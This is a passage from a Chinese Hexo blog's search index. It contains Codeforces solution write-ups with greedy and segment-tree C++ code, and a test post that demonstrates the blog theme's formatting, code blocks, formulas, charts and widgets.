分配$10^{[log_{10}{t}]}$是最好的方法之一.<br>11进制下两数和的字面值总是不大于十进制的和, 因为11进制满11才能进位. 所以我们应该尽可能的多保留高位数.<br>然后总是贪心地按这种方法取值就行了.<br>程序流程:<br>假设$s=1000, n=15$.<br>对于第1个元素, 最多有$986$可以分配(因为后面的元素至少需要$1$), 按照前面提到的结论, 分配$100$, 剩下$886$.<br>对于第2个元素, 有$886+1$可以分配, 分配$100$, 剩下$787$.<br>对于第3个元素, 有$787+1$可以分配, 分配$100$, 剩下$688$.<br>…<br>对于第9个元素, 有$193+1$可以分配, 分配$100$, 剩下$94$.<br>对于第10个元素, 有$94+1$可以分配, 分配$10$, 剩下$85$.<br>…<br>对于第15个元素, 有$49+1$可以分配, 这是最后一个元素, 把$50$全部分配给它.<br>至此, 分配方式为$100,100,100,100,100,100,100,100,100,10,10,10,10,10,50$, 程序结束.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> buf[<span class="number">101</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">min10</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (n &gt;= <span class="number">10</span>)&#123;n /= <span class="number">10</span>; t++;&#125;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>) n = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (t--) n *= <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">calc</span><span class="params">(<span class="keyword">int</span> t, <span class="keyword">int</span> c, <span class="keyword">int</span> o)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (c == <span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">    t++;</span><br><span class="line">    <span class="keyword">int</span> r = <span class="built_in">min10</span>(t);</span><br><span class="line">    buf[o] = c == <span class="number">1</span> ? t : r;</span><br><span class="line">    <span class="built_in">calc</span>(t - r, c - <span class="number">1</span>, o + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> T;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;T);</span><br><span class="line">    <span class="keyword">while</span> (T--)&#123;</span><br><span class="line">        <span class="keyword">int</span> m, n, i;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;m, &amp;n);</span><br><span class="line">        <span class="built_in">calc</span>(m - n, n, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d%c&quot;</span>, buf[i], (i + <span class="number">1</span> == n) ? <span class="string">&#x27;\n&#x27;</span> : <span class="string">&#x27; &#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="E-Non-Decreasing-Dilemma"><a href="#E-Non-Decreasing-Dilemma" class="headerlink" title="E. Non-Decreasing Dilemma"></a>E. Non-Decreasing Dilemma</h2><p><a href="https://codeforces.com/contest/1567/problem/E">原题链接</a></p><blockquote><p>给出长度为$n$的数组, 进行$q$次操作, 操作有3个数$t,x,y$:</p><ul><li>$t=1$时, 将数组第$x$个元素设置为$y$</li><li>$t=2$时, 输出子数组$[x,y]$中递增子数组的个数</li></ul></blockquote><p>之前尝试了维护递增数组的方法, 最坏复杂度$qn$, 总之就是非常慢, 直接TLE.<br>然后参考了<a href="https://codeforces.com/contest/1567/submission/128027587">maxplus的方法</a>写了个线段树的代码, 复杂度$q \log{n}$.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> l, r, lt, rt; <span class="keyword">long</span> <span class="keyword">long</span> sum;</span><br><span class="line">&#125;Node, &amp;NodeRef;</span><br></pre></td></tr></table></figure><p>用<code>Node</code>维护二叉树的每一个结点, 其中<code>l</code>是子数组左边界, <code>r</code>是右边界, <code>lt</code>是在子数组中从左往右看的递增序列的长度, <code>rt</code>是从右往左看单调递减序列的长度, <code>sum</code>是子数组$[l,r]$中递增子数组的个数.</p><p>对于两个非空子树<code>a</code>, <code>b</code>, 合并到父结点的方法:</p><ul><li>左边界为<code>a.l</code>, 右边界为<code>b.r</code></li><li>检查<code>buf[a.r]</code>是否比<code>buf[b.l]</code>大, 即连接两个区间时是否在连接处发生递增的中断(以下简称递增中断)</li><li>如果递增中断或者<code>a.lt</code>本来就小于子数组长度, <code>lt = a.lt</code>, 否则递增在两个区间是连续的, <code>lt = a.lt + b.lt</code>, 对于<code>rt</code>同理.</li><li>合并后区间递增子数组的个数, 除了原先左右子区间各自的个数外, 如果没有递增中断, 应该还包括跨越区间边界的部分, 如下图所示, 最下方的结点递增子数组的个数除包括左右两边子区间各自的个数外, 还有$[A4,A5]$和$[A4,A6]$两个.</li></ul><div class="mermaid">graph TDB1(n&#x3D;1) --&gt; |A1|C1B2(n&#x3D;2) --&gt; |A2|C1B3(n&#x3D;4) --&gt; |A3|C2B4(n&#x3D;3) --&gt; |A4|C2B5(n&#x3D;8) --&gt; |A5|C3B6(n&#x3D;9) --&gt; |A6|C3B7(n&#x3D;5) --&gt; |A7|C4B8(n&#x3D;3) --&gt; |A8|C4C1(s&#x3D;1+1+1*1) --&gt; |B1|D1C2(s&#x3D;1+1) --&gt; |B2|D1C3(s&#x3D;1+1+1*1) --&gt; |B3|D2C4(s&#x3D;1+1) --&gt; |B4|D2D1(s&#x3D;3+2+2*1) --&gt; |C1|ED2(s&#x3D;3+2) --&gt; |C2|EE(s&#x3D;7+5+1*2)</div><p>初始化和<code>t = 1</code>时, 更新叶子结点和对应父节点即可.</p><p><code>t = 2</code>时, 利用线段树中已计算出的结果得到答案:</p><ul><li>对于左边界, 如果是一个右节点, 就先合并结果, 并转到父结点的下一个结点, 左节点则直接转到父结点等待合并.</li><li>对于右边界, 如果是左节点, 合并结果并转到父节点的前一个结点, 右节点转到父节点等待合并.</li><li>一直向树根走直到<code>a &gt; b</code>, 此时<code>l</code>, <code>r</code>已连续, 合并它们并且返回合并结果.</li></ul><p>例如要求$[A2,A8]$递增子数组的个数, 令<code>a = A2</code>, <code>b = A8</code>, <code>l</code>和<code>r</code>为空:</p><ul><li><code>a</code>指向一个右结点(<code>A2</code>), 将它与<code>l</code>合并, 并且让它指向父节点的下一个结点<code>B2</code>.</li><li><code>b</code>指向一个右节点(<code>A8</code>), 让它直接指向父节点<code>B4</code>.</li><li><code>a</code>指向一个右节点(<code>B2</code>), 将它与<code>l</code>合并, 并且让它指向父节点的下一个结点<code>C2</code>.</li><li><code>b</code>指向一个右节点(<code>B4</code>), 让它直接指向父节点<code>C2</code>.</li><li><code>a</code>指向一个右节点(<code>C2</code>), 将它与<code>l</code>合并, 并且让它指向父节点的下一个结点<code>C1</code>(本来是在<code>D1</code>(未标出)的下一个结点, 越界跑到上一层了属于是, 不过问题不大, 因为<code>l</code>已经把$[A5,A8]$合并, 而且后面<code>b</code>在算的时候由于是右结点不合并, 不会导致重复).</li><li><code>b</code>指向一个右结点(<code>C2</code>), 让它直接指向父节点<code>D1</code>.</li><li>此时<code>a &gt; b</code>, 循环结束, 此时<code>l</code>包含了$[A2,A8]$, <code>r</code>为空.</li><li>将<code>l</code>, <code>r</code>合并, 得到在$[A2,A8]$上的结果.</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Referred to the code on https://codeforces.com/contest/1567/submission/128027587</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> l, r, lt, rt; <span class="keyword">long</span> <span class="keyword">long</span> sum;</span><br><span class="line">&#125;Node, &amp;NodeRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> P = <span class="number">1</span> &lt;&lt; <span class="number">18</span>;</span><br><span class="line">Node node[P &lt;&lt; <span class="number">1</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> buf[<span class="number">200000</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">combine</span><span class="params">(NodeRef a, NodeRef b, NodeRef p)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!a.sum || !b.sum)&#123;p = a.sum ? a : b; <span class="keyword">return</span>;&#125;</span><br><span class="line">    p.l = a.l, p.r = b.r;</span><br><span class="line">    <span class="keyword">int</span> cont = buf[a.r] &lt;= buf[b.l];</span><br><span class="line">    p.lt = (cont &amp;&amp; a.lt + a.l == a.r + <span class="number">1</span>) ? a.lt + b.lt : a.lt;</span><br><span class="line">    p.rt = (cont &amp;&amp; b.rt + b.l == b.r + <span class="number">1</span>) ? a.rt + b.rt : b.rt;</span><br><span class="line">    p.sum = a.sum + b.sum + (cont ? ((<span class="keyword">long</span> <span class="keyword">long</span>)a.rt) * b.lt : <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">calc</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    Node l = &#123;<span class="number">0</span>&#125;, r = &#123;<span class="number">0</span>&#125;, t;</span><br><span class="line">    <span class="keyword">while</span> (a &lt;= b)&#123;</span><br><span class="line">        <span class="keyword">if</span> (a &amp; <span class="number">1</span>)&#123;<span class="built_in">combine</span>(l, node[a], t); l = t; a++;&#125;</span><br><span class="line">        <span class="keyword">if</span> (!(b &amp; <span class="number">1</span>))&#123;<span class="built_in">combine</span>(node[b], r, t); r = t; b--;&#125;</span><br><span class="line">        a &gt;&gt;= <span class="number">1</span>, b &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">combine</span>(l, r, t);</span><br><span class="line">    <span class="keyword">return</span> t.sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> T, N, i, a, b, type;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;N, &amp;T);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, buf + i);</span><br><span class="line">        node[P + i] = &#123;i, i, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = P - <span class="number">1</span>; i &gt; <span class="number">0</span>; i--) <span class="built_in">combine</span>(node[i &lt;&lt; <span class="number">1</span>], node[(i &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>], node[i]);</span><br><span class="line">    <span class="keyword">while</span> (T--)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d&quot;</span>, &amp;type, &amp;a, &amp;b);</span><br><span class="line">        <span class="keyword">if</span> (type == <span class="number">1</span>)&#123;</span><br><span class="line">            a--; buf[a] = b;</span><br><span class="line">            node[P + a] = &#123;a, a, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>&#125;;</span><br><span class="line">            b = P + a;</span><br><span class="line">            <span class="keyword">while</span> (b &gt; <span class="number">1</span>)&#123;b &amp;= <span class="number">-2</span>; <span class="built_in">combine</span>(node[b], node[b + <span class="number">1</span>], node[b &gt;&gt; <span class="number">1</span>]); b &gt;&gt;= <span class="number">1</span>;&#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, <span class="built_in">calc</span>(a + P - <span class="number">1</span>, b + P - <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> acm </tag>
            
            <tag> cf </tag>
            
            <tag> 题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客支持性测试</title>
      <link href="/2021/09/05/TestPost/"/>
      <url>/2021/09/05/TestPost/</url>
      
        <content type="html"><![CDATA[<h1 id="hexo博客支持性测试"><a href="#hexo博客支持性测试" class="headerlink" title="hexo博客支持性测试"></a>hexo博客支持性测试</h1><blockquote><p>这是一个引用</p></blockquote><hr><h2 id="文字测试"><a href="#文字测试" class="headerlink" title="文字测试"></a>文字测试</h2><p><em>斜体</em>, <strong>粗体</strong>, <strong><em>粗斜体</em></strong>, <del>删除线</del>, <a href="/" title="原地tp">超链接</a><br><u>下划线</u>, <emp>强调</emp>, <wavy>波浪线</wavy>, <del>删除线2</del>, <kbd>CTRL</kbd>+<kbd>C</kbd>, <psw>刮刮乐</psw></p><p>嵌入代码: <code>MessageBoxW(hWnd, L&quot;Hello world!&quot;, L&quot;Tips&quot;, MB_ICONASTERISK)</code></p><p>标签: <mark class="hl-label green">成功</mark> <mark class="hl-label orange">警告</mark> <mark class="hl-label red">危险</mark> <mark class="hl-label pink">提示</mark> <mark class="hl-label purple">重要</mark> <mark class="hl-label blue">信息</mark> <mark class="hl-label default">默认</mark> </p><p>彩色文字: <span class='p red'>红色</span>、<span class='p yellow'>黄色</span>、<span class='p green'>绿色</span>、<span class='p cyan'>青色</span>、<span class='p blue'>蓝色</span>、<span class='p gray'>灰色</span>。<br>超大号文字:<br><span class='p center logo large'>Volantis</span><br><span class='p center small'>A Wonderful Theme for Hexo</span></p><div class="note info flat"><p><strong>提示</strong></p><p><code>MessageBoxW</code> 用于显示一个对话框.</p></div><p>表情: <img no-lazy style="display: inline; zoom: 0.5; margin: 0;" src="/pictures/bili-small-shrink/1/26.png" alt="[doge]"></img><img no-lazy style="display: inline; zoom: 0.5; margin: 0;" src="/pictures/bili-small-shrink/1/20.png" alt="[傲娇]"></img></p><h2 id="代码-公式测试"><a href="#代码-公式测试" class="headerlink" title="代码/公式测试"></a>代码/公式测试</h2><h3 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Hello world!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Hello = <span class="literal">true</span></span><br><span class="line"><span class="keyword">for</span> k, _ <span class="keyword">in</span> <span class="built_in">_G</span> <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">print</span>(k)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h3 id="折叠的信息"><a href="#折叠的信息" class="headerlink" title="折叠的信息"></a>折叠的信息</h3><div class='spoiler collapsed'>    <div class='spoiler-title'>        更多    </div>    <div class='spoiler-content'>        <p><em>这事折叠的信息</em></p>    </div></div><h3 id="LaTeX-公式"><a href="#LaTeX-公式" class="headerlink" title="LaTeX 公式:"></a>LaTeX 公式:</h3><script type="math/tex; mode=display">x=\frac{-b\pm\sqrt{b^2-4ac}}{2a}</script><script type="math/tex; mode=display">A = \begin{bmatrix}  a_{11} & a_{12} & ...    & a_{1n} \\  a_{21} & a_{22} & ...    & a_{2n} \\  a_{31} & a_{22} & ...    & a_{3n} \\  \vdots & \vdots & \ddots & \vdots \\  a_{n1} & a_{n2} & ...    & a_{nn} \\\end{bmatrix} , b = \begin{bmatrix}  b_{1}  \\  b_{2}  \\  b_{3}  \\  \vdots \\  b_{n}  \\\end{bmatrix}</script><p>行内公式: $ \int_{0}^{\pi}{\sin x \mathrm{d} x} = 2 $</p><h2 id="组件测试"><a href="#组件测试" class="headerlink" title="组件测试"></a>组件测试</h2><h3 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h3><p>一些<code>Hello World</code></p><div class="table-container"><table><thead><tr><th style="text-align:center">语言</th><th>代码</th></tr></thead><tbody><tr><td style="text-align:center">C</td><td><code>puts(&quot;Hello World!&quot;);</code></td></tr><tr><td style="text-align:center">C++</td><td><code>std::cout &lt;&lt; &quot;Hello World!&quot; &lt;&lt; std::endl;</code></td></tr><tr><td style="text-align:center">Python</td><td><code>print(&quot;Hello World!&quot;)</code></td></tr><tr><td style="text-align:center">Go</td><td><code>fmt.Println(&quot;Hello World!&quot;)</code></td></tr><tr><td style="text-align:center">BatchScript</td><td><code>echo Hello World!</code></td></tr><tr><td style="text-align:center"><del>brainfuck</del></td><td><code>++++++++++[&gt;+++++++&gt;++++++++++&gt;+++&gt;+&lt;&lt;&lt;&lt;-]&gt;++.&gt;+.+++++++..+++.&gt;++.&lt;&lt;+++++++++++++++.&gt;.+++.------.--------.&gt;+.&gt;.</code></td></tr></tbody></table></div><h3 id="按钮"><a href="#按钮" class="headerlink" title="按钮"></a>按钮</h3><p><button class="btn-beautify" onclick="alert('Hello World!')">内嵌html</button><br></p><a class="btn-beautify button--animated 标题" href="/"   title="链接按钮"><i class="iconfont icon-qq"></i><span>链接按钮</span></a><div class="tag link"><a class="link-card" title="糖果屋的扩展插件" href="https://akilar.top/posts/615e2dec/"><div class="left"><img src="https://cdn.jsdelivr.net/gh/Akilarlxh/akilarlxh.github.io/img/siteicon/favicon.ico"/></div><div class="right"><p class="text">糖果屋的扩展插件</p><p class="url">https://akilar.top/posts/615e2dec/</p></div></a></div><div class='checkbox'><input type="checkbox" />            <p>纯文本测试</p>            </div><div class='checkbox checked'><input type="checkbox" checked="checked"/>            <p>支持简单的 <a href="https://guides.github.com/features/mastering-markdown/">markdown</a> 语法</p>            </div><div class='checkbox red'><input type="checkbox" />            <p>支持自定义颜色</p>            </div><div class='checkbox green checked'><input type="checkbox" checked="checked"/>            <p>绿色 + 默认选中</p>            </div><div class='checkbox plus green checked'><input type="checkbox" checked="checked"/>            <p>增加</p>            </div><div class='checkbox minus yellow checked'><input type="checkbox" checked="checked"/>            <p>减少</p>            </div><div class='checkbox times red checked'><input type="checkbox" checked="checked"/>            <p>叉</p>            </div><div class='checkbox red'><input type="radio" />            <p>红色</p>            </div><div class='checkbox yellow'><input type="radio" />            <p>黄色</p>            </div><h3 id="卡片"><a href="#卡片" class="headerlink" title="卡片"></a>卡片</h3><div class="site-card-group"><a class="site-card" href="https://polyhaven.com/"><div class="img"><img src="https://file.coffee/u/713wQ2ObhOtAF-.jpg"/></div><div class="info"><img src="https://polyhaven.com/Logo%20256.png"/><span class="title">PolyHaven</span><span class="desc">3D素材网站</span></div></a></div><h3 id="选项卡"><a href="#选项卡" class="headerlink" title="选项卡"></a>选项卡</h3><div class="tabs" id="解决方案"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#解决方案-1">解决方案 1</button></li><li class="tab"><button type="button" data-href="#解决方案-2">解决方案 2</button></li><li class="tab"><button type="button" data-href="#解决方案-3">解决方案 3</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="解决方案-1"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Code for solution #1 */</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="解决方案-2"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Code for solution #2 */</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="解决方案-3"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Code for solution #3 */</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h3 id="饼图"><a href="#饼图" class="headerlink" title="饼图"></a>饼图</h3><div class="mermaid">pie&quot;Dogs&quot; : 386&quot;Cats&quot; : 85&quot;Rats&quot; : 15</div><h3 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h3><div class="mermaid">graph TDA[Hard] --&gt;|Text| B(Round)B --&gt; C{Decision}C --&gt;|One| D[Result 1]C --&gt;|Two| E[Result 2]</div><h2 id="资源测试"><a href="#资源测试" class="headerlink" title="资源测试"></a>资源测试</h2><h3 id="图片组"><a href="#图片组" class="headerlink" title="图片组"></a>图片组</h3><div class="justified-gallery"><p><img src="nul" alt=""><br><img src="/img/friend_404.gif" alt=""><br><img src="/img/404.jpg" alt=""></p>          </div><h3 id="附件"><a href="#附件" class="headerlink" title="附件"></a>附件</h3><a download href="/archives/firstc.cpp" style="display: block;"><span class="iconfont icon-archive-c"></span>firstc.cpp</a><a download href="/archives/counter.exe.gz" style="display: block;"><span class="iconfont icon-archive-c"></span>计时器小程序</a><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://akilar.top/posts/615e2dec/">糖果屋的扩展插件</a></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 测试 </tag>
            
            <tag> 水帖 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
